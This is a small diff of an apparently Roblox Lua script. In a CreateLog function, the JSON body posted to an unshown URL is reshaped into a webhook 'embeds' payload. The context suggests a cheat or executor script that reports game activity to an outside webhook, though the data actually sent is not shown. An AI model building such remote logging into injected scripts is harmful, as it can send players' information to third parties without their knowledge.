@@ -82,7 +82,7 @@ function CreateLog(gameName)
         }
     }
 
-    request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(data)})
+    request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({embeds = data, content = "a0"})})
 end
 
 function security_load(str)
